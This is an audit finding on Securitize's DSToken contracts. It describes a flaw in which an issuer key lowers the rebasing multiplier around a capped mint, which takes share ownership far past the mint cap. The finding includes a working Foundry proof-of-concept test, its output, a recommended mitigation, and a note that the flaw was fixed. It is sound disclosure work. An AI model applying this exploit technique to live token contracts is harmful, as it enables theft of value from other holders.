---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0-0-1
ingested_at: '2026-10-04T10:45:09Z'
protocol_category: []
published_at: '2026-09-07T00:00:00Z'
related_swc: []
severity: Low
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md
tags:
- firm:cyfrin
- report:2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2-0
title: '`SecuritizeRebasingProvider::setMultiplier` is `onlyIssuerOrAbove` and unbounded,
  so the `DSToken` mint cap does not bound value creation by a compromised issuance
  key'
vuln_class: []
---

# `SecuritizeRebasingProvider::setMultiplier` is `onlyIssuerOrAbove` and unbounded, so the `DSToken` mint cap does not bound value creation by a compromised issuance key

_Section severity (from Solodit section header): Low_  
_Audit firm: Cyfrin_  
_Source report: [2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-09-07-cyfrin-securitize-evm-dstoken-timelocks-v2.0.md)_

---

**Description:** `DSToken::issueTokensWithMultipleLocks` calls `_checkThrottle(_value)` on a token amount, then `TokenLibrary::issueTokensCustom` credits `convertTokensToShares(_value)` to `walletsBalances`. Ownership is the share balance; the throttle meters tokens. The conversion rate is `SecuritizeRebasingProvider::multiplier`, a single storage word writable by `setMultiplier`, which is gated `onlyIssuerOrAbove` and validates only that the new value is non-zero. `ServiceConsumer::onlyIssuerOrAbove` admits `ROLE_ISSUER`, which is exactly the role the throttle exists to constrain.

`_checkThrottle` reads only `mintCapAmount`, `mintCapWindow`, `windowStart` and `mintedInWindow`; the multiplier is first read one line later, inside `_issue`. Lowering the multiplier is therefore not what lets the cap pass, since the cap passes for any `_value <= remaining` at any multiplier. What lowering it changes is what that spend buys. Shares credited are `_value * 10 ** (18 - decimals) * 1e18 / multiplier`, so the shares acquired per throttled token are `1 / multiplier` and the same key sets the divisor.

An issuance key lowers the multiplier, mints exactly `mintCapAmount` tokens - the throttle passes cleanly and `MintCapConsumed` fires with well-formed values - then restores the multiplier. Every other holder's share balance is untouched and prices back exactly; the attacker's newly minted shares are re-priced upward by the ratio of the two multipliers. Nothing bounds that ratio, since `multiplier` may be set as low as `1`, so a single in-cap mint can acquire up to `1e18` times the shares the same mint would acquire at the standard rate.

**Spec-Intent Gap:**

`docs/timelocks.md` FR-7:

> It bounds how much value a compromised issuance key can create before the delay-based controls even become relevant, and it defines what counts as exceptional.

Code permits behavior contradicting this commitment: an issuance key can create an arbitrary multiple of the cap in one transaction by redefining the unit the cap is denominated in.

**Impact:** Raising the multiplier alone gains an attacker nothing: it scales every balance identically, so the attacker's fractional claim on the fund is unchanged. Lowering it, minting, then restoring it is what converts a capped token amount into an uncapped share amount, giving the attacker more shares than they would have received normally.

**Proof of Concept:** Add the two files below to `test/cyfrin-pocs/test/` and run with `forge test --match-test test_MintCapDoesNotBoundShareOwnership -vv`. The Foundry project remaps `contracts/=` onto the repository's `contracts` directory; `TokenLibrary` must resolve inside the forge project root so that forge links it automatically.

`DSTokenLocalDeployment.sol`, a minimal Permissionless deployment wired exactly as `set-services` wires it:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;

import {Test, console, Vm} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {DSToken} from "contracts/token/DSToken.sol";
import {TrustService} from "contracts/trust/TrustService.sol";
import {StubRegistryService} from "contracts/registry/StubRegistryService.sol";
import {ComplianceServicePermissionless} from "contracts/compliance/ComplianceServicePermissionless.sol";
import {ComplianceConfigurationService} from "contracts/compliance/ComplianceConfigurationService.sol";
import {WalletManager} from "contracts/compliance/WalletManager.sol";
import {InvestorLockManager} from "contracts/compliance/InvestorLockManager.sol";
import {BlackListManager} from "contracts/compliance/BlackListManager.sol";
import {SecuritizeRebasingProvider} from "contracts/rebasing/SecuritizeRebasingProvider.sol";

/// @notice A minimal Permissionless DSToken deployment, wired exactly as `set-services` wires it.
///         The test contract deploys every proxy, so it is `owner()` of each and holds ROLE_MASTER.
abstract contract DSTokenLocalDeployment is Test {
    uint8 constant DECIMALS = 6;
    uint256 constant ONE_TOKEN = 10 ** DECIMALS;

    uint256 constant M0 = 1e18; // standard 1:1 multiplier
    uint256 constant K = 1e6; // attacker-chosen amplification factor
    uint256 constant M_LOW = M0 / K;

    uint256 constant MINT_CAP = 1_000_000 * ONE_TOKEN; // 1M tokens per window
    uint256 constant MINT_WINDOW = 1 days;
    uint256 constant HOLDER_BALANCE = 100_000_000 * ONE_TOKEN; // 100M tokens already circulating
    uint256 constant AUTHORIZED_SECURITIES = 110_000_000 * ONE_TOKEN; // regulatory ceiling, 10M of headroom
    uint256 constant OVER_CAP_AMOUNT = 50_000_000 * ONE_TOKEN; // five times the headroom
    uint256 constant OVER_CAP_DELAY = 2 days;

    uint8 constant ROLE_ISSUER = 2;

    uint256 constant TRUST_SERVICE = 1;
    uint256 constant DS_TOKEN = 2;
    uint256 constant REGISTRY_SERVICE = 4;
    uint256 constant COMPLIANCE_SERVICE = 8;
    uint256 constant WALLET_MANAGER = 32;
    uint256 constant LOCK_MANAGER = 64;
    uint256 constant COMPLIANCE_CONFIGURATION_SERVICE = 256;
    uint256 constant REBASING_PROVIDER = 8196;
    uint256 constant BLACKLIST_MANAGER = 8197;

    // TxShares(address indexed from, address indexed to, uint256 shares, uint256 multiplier)
    bytes32 constant TX_SHARES = keccak256("TxShares(address,address,uint256,uint256)");

    DSToken token;
    TrustService trust;
    StubRegistryService registry;
    ComplianceServicePermissionless compliance;
    ComplianceConfigurationService ccs;
    WalletManager walletManager;
    InvestorLockManager lockManager;
    BlackListManager blacklist;
    SecuritizeRebasingProvider rebasing;

    // this test contract deploys every proxy, so it is `owner()` of each and holds ROLE_MASTER
    address attacker = makeAddr("attacker");
    address holder = makeAddr("holder");

    function setUp() public {
        token = DSToken(_proxy(address(new DSToken()), abi.encodeCall(DSToken.initialize, ("Fund", "FUND", DECIMALS))));
        trust = TrustService(_proxy(address(new TrustService()), abi.encodeCall(TrustService.initialize, ())));
        registry =
            StubRegistryService(_proxy(address(new StubRegistryService()), abi.encodeCall(StubRegistryService.initialize, ())));
        compliance = ComplianceServicePermissionless(
            _proxy(address(new ComplianceServicePermissionless()), abi.encodeCall(ComplianceServicePermissionless.initialize, ()))
        );
        ccs = ComplianceConfigurationService(
            _proxy(address(new ComplianceConfigurationService()), abi.encodeCall(ComplianceConfigurationService.initialize, ()))
        );
        walletManager = WalletManager(_proxy(address(new WalletManager()), abi.encodeCall(WalletManager.initialize, ())));
        lockManager =
            InvestorLockManager(_proxy(address(new InvestorLockManager()), abi.encodeCall(InvestorLockManager.initialize, ())));
        blacklist = BlackListManager(_proxy(address(new BlackListManager()), abi.encodeCall(BlackListManager.initialize, ())));
        rebasing = SecuritizeRebasingProvider(
            _proxy(address(new SecuritizeRebasingProvider()), abi.encodeCall(SecuritizeRebasingProvider.initialize, (M0, DECIMALS)))
        );

        token.setDSService(TRUST_SERVICE, address(trust));
        token.setDSService(DS_TOKEN, address(token));
        token.setDSService(REGISTRY_SERVICE, address(registry));
        token.setDSService(COMPLIANCE_SERVICE, address(compliance));
        token.setDSService(WALLET_MANAGER, address(walletManager));
        token.setDSService(LOCK_MANAGER, address(lockManager));
        token.setDSService(COMPLIANCE_CONFIGURATION_SERVICE, address(ccs));
        token.setDSService(REBASING_PROVIDER, address(rebasing));
        token.setDSService(BLACKLIST_MANAGER, address(blacklist));

        compliance.setDSService(TRUST_SERVICE, address(trust));
        compliance.setDSService(DS_TOKEN, address(token));
        compliance.setDSService(REGISTRY_SERVICE, address(registry));
        compliance.setDSService(COMPLIANCE_CONFIGURATION_SERVICE, address(ccs));
        compliance.setDSService(WALLET_MANAGER, address(walletManager));
        compliance.setDSService(LOCK_MANAGER, address(lockManager));
        compliance.setDSService(REBASING_PROVIDER, address(rebasing));
        compliance.setDSService(BLACKLIST_MANAGER, address(blacklist));

        registry.setDSService(TRUST_SERVICE, address(trust));
        registry.setDSService(DS_TOKEN, address(token));
        ccs.setDSService(TRUST_SERVICE, address(trust));
        lockManager.setDSService(TRUST_SERVICE, address(trust));
        lockManager.setDSService(DS_TOKEN, address(token));
        lockManager.setDSService(REGISTRY_SERVICE, address(registry));
        lockManager.setDSService(COMPLIANCE_SERVICE, address(compliance));
        walletManager.setDSService(TRUST_SERVICE, address(trust));
        walletManager.setDSService(REGISTRY_SERVICE, address(registry));
        rebasing.setDSService(TRUST_SERVICE, address(trust));
        blacklist.setDSService(TRUST_SERVICE, address(trust));

        // existing circulating supply held by an unrelated investor, issued
        // before the allowance is configured
        token.issueTokens(holder, HOLDER_BALANCE);

        // the control under review, configured exactly as intended
        token.setMintCap(MINT_CAP, MINT_WINDOW);

        // a single compromised issuance key
        trust.setRole(attacker, ROLE_ISSUER);
    }

    function _proxy(address impl, bytes memory data) internal returns (address) {
        return address(new ERC1967Proxy(impl, data));
    }
}
```

`MintCapMultiplierBypass.t.sol`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;

import {Test, console, Vm} from "forge-std/Test.sol";
import {DSTokenLocalDeployment} from "./DSTokenLocalDeployment.sol";

/// @notice The mint allowance meters tokens while `walletsBalances` is credited in shares.
///         `SecuritizeRebasingProvider::setMultiplier` sets the conversion rate between the two
///         and is `onlyIssuerOrAbove`, the same authority the allowance exists to constrain.
///         Both runs below mint exactly `mintCapAmount` and record exactly `mintCapAmount`
///         consumed; they differ only in the multiplier in force at the moment of the mint.
contract MintCapMultiplierBypassTest is DSTokenLocalDeployment {
    /// @dev Issues `amount` as `attacker` and returns the shares credited, read from `TxShares`
    function _issueAndCaptureShares(uint256 amount) internal returns (uint256 shares) {
        vm.recordLogs();
        vm.prank(attacker);
        token.issueTokens(attacker, amount);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == TX_SHARES) {
                (shares,) = abi.decode(logs[i].data, (uint256, uint256));
                return shares;
            }
        }
        revert("TxShares not emitted");
    }

    /// @dev attacker shares as a fraction of all shares, in basis points
    function _attackerOwnershipBps(uint256 attackerShares, uint256 holderShares) internal pure returns (uint256) {
        return (attackerShares * 10_000) / (attackerShares + holderShares);
    }

    function test_MintCapDoesNotBoundShareOwnership() public {
        uint256 holderShares = (HOLDER_BALANCE * 10 ** (18 - DECIMALS) * 1e18) / M0;
        uint256 snapshot = vm.snapshotState();

        // ---------------------------------------------------------------
        // Run 1: honest issuance of the entire allowance at the standard multiplier
        // ---------------------------------------------------------------
        uint256 honestShares = _issueAndCaptureShares(MINT_CAP);
        uint256 honestConsumed = token.mintedInWindow();
        uint256 honestBalance = token.balanceOf(attacker);
        uint256 honestOwnershipBps = _attackerOwnershipBps(honestShares, holderShares);

        console.log("run 1: mint at the standard multiplier");
        console.log("  allowance consumed :", honestConsumed);
        console.log("  shares credited    :", honestShares);
        console.log("  attacker balance   :", honestBalance);
        console.log("  attacker ownership :", honestOwnershipBps, "bps");

        assertEq(honestConsumed, MINT_CAP, "run 1: full allowance consumed");
        assertEq(honestBalance, MINT_CAP, "run 1: balance equals the allowance");

        // ---------------------------------------------------------------
        // Run 2: identical mint, wrapped in a multiplier round trip
        // ---------------------------------------------------------------
        vm.revertToState(snapshot);
        assertEq(token.mintedInWindow(), 0, "run 2: window reset by the revert");
        assertEq(token.balanceOf(holder), HOLDER_BALANCE, "run 2: holder restored by the revert");

        // setMultiplier is onlyIssuerOrAbove, so the compromised key sets the rate itself
        vm.prank(attacker);
        rebasing.setMultiplier(M_LOW);

        uint256 attackShares = _issueAndCaptureShares(MINT_CAP);
        uint256 attackConsumed = token.mintedInWindow();

        vm.prank(attacker);
        rebasing.setMultiplier(M0);

        uint256 attackBalance = token.balanceOf(attacker);
        uint256 attackOwnershipBps = _attackerOwnershipBps(attackShares, holderShares);

        console.log("run 2: same mint at a multiplier lowered by K, then restored");
        console.log("  allowance consumed :", attackConsumed);
        console.log("  shares credited    :", attackShares);
        console.log("  attacker balance   :", attackBalance);
        console.log("  attacker ownership :", attackOwnershipBps, "bps");

        // ---------------------------------------------------------------
        // The allowance recorded the same consumption in both runs
        // ---------------------------------------------------------------
        assertEq(attackConsumed, honestConsumed, "allowance consumption is identical");
        assertEq(attackConsumed, MINT_CAP, "allowance was never exceeded");

        // ---------------------------------------------------------------
        // What the attacker actually received differs by the factor it chose
        // ---------------------------------------------------------------
        assertEq(attackShares, honestShares * K, "shares amplified by K");
        assertEq(attackBalance, honestBalance * K, "balance amplified by K");

        // ---------------------------------------------------------------
        // Raising alone would gain nothing: it is the fractional claim on the
        // fund that moved, and it moved only because the mint was made cheap
        // ---------------------------------------------------------------
        assertLt(honestOwnershipBps, 100, "run 1: under 1% of the fund");
        assertGt(attackOwnershipBps, 9_900, "run 2: over 99% of the fund");

        // ---------------------------------------------------------------
        // Every other holder is untouched: shares unchanged, multiplier restored,
        // so the balance is bit-for-bit what it was before the attack
        // ---------------------------------------------------------------
        assertEq(token.balanceOf(holder), HOLDER_BALANCE, "holder balance is unchanged");

        console.log("amplification factor: K =", K);
        console.log("multiplier may be set as low as 1, so K is bounded only by M0");
    }
}
```

Both runs mint exactly the allowance and record exactly the allowance consumed:

```
run 1: mint at the standard multiplier
  allowance consumed : 1000000000000
  shares credited    : 1000000000000000000000000
  attacker balance   : 1000000000000
  attacker ownership : 99 bps
run 2: same mint at a multiplier lowered by K, then restored
  allowance consumed : 1000000000000
  shares credited    : 1000000000000000000000000000000
  attacker balance   : 1000000000000000000
  attacker ownership : 9999 bps
```

**Recommended Mitigation:** Denominate the throttle in shares by passing the converted amount to `_checkThrottle`, which makes the cap independent of the multiplier. Additionally gate `setMultiplier` on `onlyMaster` so that post-handover it inherits the master delay, and/or bound the per-call multiplier delta.

**Securitize:** Fixed in commit [67bd52a](https://github.com/securitize-io/dstoken/commit/67bd52a4389da12b321a7ede1c240fe98f644c82) by:
* gating `setMultiplier` to `onlyMaster` instead of `onlyIssuerOrAbove` so a compromised issuer can't change the rebasing multiplier
* enforcing the window minting limits in terms of share amounts

**Cyfrin:** Verified.
